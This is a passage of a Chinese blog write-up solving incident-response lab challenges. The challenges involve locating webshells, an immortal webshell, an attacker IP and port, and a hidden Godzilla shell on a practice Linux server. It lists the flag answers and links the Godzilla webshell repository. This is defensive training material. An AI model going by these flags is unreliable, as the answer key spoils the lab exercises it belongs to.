

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title>玄机应急响应靶场刷题 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="玄机应急响应靶场刷题" />
<meta property="og:description" content="玄机应急响应靶场刷题wp" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://scofield1920.github.io/xj_emergency/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-06-11T00:00:00+08:00" />
<meta property="article:modified_time" content="2024-06-11T00:00:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="玄机应急响应靶场刷题"/>
<meta name="twitter:description" content="玄机应急响应靶场刷题wp"/>
<meta name="application-name" content="scofield-blog">
<meta name="apple-mobile-web-app-title" content="scofield-blog">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/xj_emergency/" /><link rel="prev" href="http://scofield1920.github.io/2024fic/" /><link rel="next" href="http://scofield1920.github.io/chunqiuyunjing-greatwall/" />
<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "玄机应急响应靶场刷题",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/scofield1920.github.io\/xj_emergency\/"
        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "wp, emergency","wordcount":  1287 ,
        "url": "http:\/\/scofield1920.github.io\/xj_emergency\/","datePublished": "2024-06-11T00:00:00+08:00","dateModified": "2024-06-11T00:00:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "xxxx","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
                    "width":  528 ,
                    "height":  560 
                }},"author": {
                "@type": "Person",
                "name": "Sc0fie1d"
            },"description": ""
    }
    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
</head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
        window.switchThemeEventSet = new Set()
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
                        <option value="light">Light</option>
                        <option value="dark">Dark</option>
                        <option value="black">Black</option>
                        <option value="auto">Auto</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
                    <option value="light">Light</option>
                    <option value="dark">Dark</option>
                    <option value="black">Black</option>
                    <option value="auto">Auto</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">Contents</h2>
        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
  <ul>
    <li><a href="#第一章-应急响应-linux入侵排查">第一章 应急响应-Linux入侵排查</a></li>
    <li><a href="#第一章-应急响应-webshell查杀">第一章 应急响应-webshell查杀</a></li>
    <li><a href="#第一章-应急响应-linux日志分析">第一章 应急响应-Linux日志分析</a></li>
    <li><a href="#第二章-日志分析-redis应急响应">第二章 日志分析-redis应急响应</a></li>
    <li><a href="#第二章-日志分析-apache日志分析">第二章 日志分析-apache日志分析</a></li>
    <li><a href="#第二章-日志分析-mysql应急响应">第二章 日志分析-mysql应急响应</a></li>
    <li><a href="#第三章-权限维持-linux权限维持-隐藏">第三章 权限维持-Linux权限维持-隐藏</a></li>
    <li><a href="#第五章-windows实战-evtx日志文件分析">第五章 Windows实战-evtx日志文件分析</a></li>
    <li><a href="#第五章-linux实战-挖矿">第五章 Linux实战-挖矿</a></li>
    <li><a href="#第七章-常见攻击事件分析--钓鱼邮件">第七章 常见攻击事件分析&ndash;钓鱼邮件</a></li>
    <li><a href="#第八章-内存马分析-java03-fastjson">第八章 内存马分析-java03-fastjson</a></li>
    <li><a href="#第九章-kswapd0挖矿">第九章-kswapd0挖矿</a></li>
  </ul>
</nav></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">玄机应急响应靶场刷题</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a>&nbsp;<a href="/categories/emergency/"><i class="far fa-folder fa-fw"></i>Emergency</a></span></div>
            <div class="post-meta-line">
    

    
        

        
        
            <span id="busuanzi_container_value_page_pv"><i class="far fa-eye fa-fw"></i>
                
                <span id="busuanzi_value_page_pv"></span>&nbsp;views</span>
        
    

<i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-06-11">2024-06-11</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2024-06-11">2024-06-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1287 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#第一章-应急响应-linux入侵排查">第一章 应急响应-Linux入侵排查</a></li>
    <li><a href="#第一章-应急响应-webshell查杀">第一章 应急响应-webshell查杀</a></li>
    <li><a href="#第一章-应急响应-linux日志分析">第一章 应急响应-Linux日志分析</a></li>
    <li><a href="#第二章-日志分析-redis应急响应">第二章 日志分析-redis应急响应</a></li>
    <li><a href="#第二章-日志分析-apache日志分析">第二章 日志分析-apache日志分析</a></li>
    <li><a href="#第二章-日志分析-mysql应急响应">第二章 日志分析-mysql应急响应</a></li>
    <li><a href="#第三章-权限维持-linux权限维持-隐藏">第三章 权限维持-Linux权限维持-隐藏</a></li>
    <li><a href="#第五章-windows实战-evtx日志文件分析">第五章 Windows实战-evtx日志文件分析</a></li>
    <li><a href="#第五章-linux实战-挖矿">第五章 Linux实战-挖矿</a></li>
    <li><a href="#第七章-常见攻击事件分析--钓鱼邮件">第七章 常见攻击事件分析&ndash;钓鱼邮件</a></li>
    <li><a href="#第八章-内存马分析-java03-fastjson">第八章 内存马分析-java03-fastjson</a></li>
    <li><a href="#第九章-kswapd0挖矿">第九章-kswapd0挖矿</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>玄机应急响应靶场刷题wp</p>
<p><a href="https://xj.edisec.net/" target="_blank" rel="noopener noreferrer">https://xj.edisec.net/</a></p>
<h2 id="第一章-应急响应-linux入侵排查" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%80%e7%ab%a0-%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94-linux%e5%85%a5%e4%be%b5%e6%8e%92%e6%9f%a5" class="header-mark"></a>第一章 应急响应-Linux入侵排查</h2><p>1.web目录存在木马，请找到木马的密码提交</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{1}
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用D盾扫描Linux主机Webshell</p>
<p><a href="https://winfsp.dev/rel/" target="_blank" rel="noopener noreferrer">https://winfsp.dev/rel/</a></p>
<p>安装完成后我们就可以通过右键“此电脑”-&gt;“映射网络驱动器”进行挂载，首次连接时需要验证SSH用户密码</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155838238.png?imageSlim" title="image-20240528155838238" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155838238.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155838238.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155838238.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155838238.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155838238.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528155838238">
    </a></figure></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\\sshfs\root@192.168.1.120          //映射home目录
</span></span><span class="line"><span class="cl">\\sshfs\root@192.168.1.120\/        //映射/根目录
</span></span><span class="line"><span class="cl">\\sshfs.r\root@192.168.1.120        //映射/根目录
</span></span><span class="line"><span class="cl">\\sshfs.r\root@192.168.1.120!1234   //映射/根目录（其他端口）
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155545395.png?imageSlim" title="image-20240528155545395" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155545395.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155545395.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155545395.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155545395.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155545395.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528155545395">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155536604.png?imageSlim" title="image-20240528155536604" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155536604.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155536604.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155536604.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155536604.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528155536604.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528155536604">
    </a></figure></p>
<p>然后用d盾扫描linux的www目录</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160326229.png?imageSlim" title="image-20240528160326229" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160326229.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160326229.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160326229.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160326229.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160326229.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528160326229">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160533385.png?imageSlim" title="image-20240528160533385" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160533385.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160533385.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160533385.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160533385.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160533385.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528160533385">
    </a></figure></p>
<p>也可以用net use命令将Linux根目录映射挂载到本地，Z为映射的磁盘盘符，这里也需要验证SSH用户密码。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">net use              //列出所有网络连接
</span></span><span class="line"><span class="cl">net use Z: /del      //删除本机映射的Z盘 
</span></span><span class="line"><span class="cl">net use * /del /y    //删除所有映射和IPC$
</span></span><span class="line"><span class="cl">net use Z: \\sshfs\root@192.168.1.120\/         //将对方根目录映射为Z盘
</span></span><span class="line"><span class="cl">net use Z: \\sshfs.r\root@192.168.1.120         //将对方根目录映射为Z盘
</span></span><span class="line"><span class="cl">net use Z: \\sshfs.r\root@192.168.1.120!1234    //将对方根目录映射为Z盘（其他端口）
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.服务器疑似存在不死马，请找到不死马的密码提交</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{hello}
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160902856.png?imageSlim" title="image-20240528160902856" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160902856.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160902856.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160902856.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160902856.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528160902856.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528160902856">
    </a></figure></p>
<p>md5爆破得到不死马的密码hello</p>
<p>3.不死马是通过哪个文件生成的，请提交文件名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{index.php}
</span></span></code></pre></td></tr></table>
</div>
</div><p>见上题</p>
<p>4.黑客留下了木马文件，请找出黑客的服务器ip提交</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{10.11.55.21}
</span></span></code></pre></td></tr></table>
</div>
</div><p>可疑文件，放到云沙箱分析一下</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161102670.png?imageSlim" title="image-20240528161102670" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161102670.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161102670.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161102670.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161102670.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161102670.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528161102670">
    </a></figure></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161510131.png?imageSlim" title="image-20240528161510131" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161510131.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161510131.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161510131.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161510131.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161510131.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528161510131">
    </a></figure></p>
<p>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag(3333)
</span></span></code></pre></td></tr></table>
</div>
</div><p>在Linux环境中执行一下</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161901254.png?imageSlim" title="image-20240528161901254" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161901254.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161901254.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161901254.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161901254.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161901254.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528161901254">
    </a></figure></p>
<p>同时netstat查看连接远端的端口</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161830896.png?imageSlim" title="image-20240528161830896" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161830896.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161830896.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161830896.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161830896.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528161830896.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528161830896">
    </a></figure></p>
<h2 id="第一章-应急响应-webshell查杀" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%80%e7%ab%a0-%e5%ba%94%e6%80%a5%e5%93%8d%e5%ba%94-webshell%e6%9f%a5%e6%9d%80" class="header-mark"></a>第一章 应急响应-webshell查杀</h2><p>1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{027ccd04-5065-48b6-a32d-77c704a5e26d}
</span></span></code></pre></td></tr></table>
</div>
</div><p>映射Linux的根目录到本地，d盾扫描www目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\\sshfs.r\root@43.192.44.224
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim" title="image-20240528162426048" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528162426048">
    </a></figure></p>
<p>在include/gz.php中发现flag</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162501029.png?imageSlim" title="image-20240528162501029" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162501029.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162501029.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162501029.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162501029.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162501029.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528162501029">
    </a></figure></p>
<p>2.黑客使用的什么工具的shell github地址的md5 flag{md5}</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{39392de3218c333f794befef07ac9257}
</span></span></code></pre></td></tr></table>
</div>
</div><p>根据gz.php(文件名)，以及shell的php代码特征可判断为哥斯拉webshell</p>
<p><a href="https://github.com/BeichenDream/Godzilla" target="_blank" rel="noopener noreferrer">https://github.com/BeichenDream/Godzilla</a></p>
<p>计算md5得到flag</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162626345.png?imageSlim" title="image-20240528162626345" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162626345.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162626345.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162626345.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162626345.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162626345.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528162626345">
    </a></figure></p>
<p>3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : /xxx/xxx/xxx/xxx/xxx.xxx</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">flag{aebac0e58cd6c5fad1695ee4d1ac1919}
</span></span></code></pre></td></tr></table>
</div>
</div><p>隐藏webshell为/var/www/html/include/Db/.Mysqli.php</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim" title="image-20240528162426048" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240528162426048.png?imageSlim 2x"
            sizes="auto"
            alt="image-20240528162426048">
    </a></figure></p>
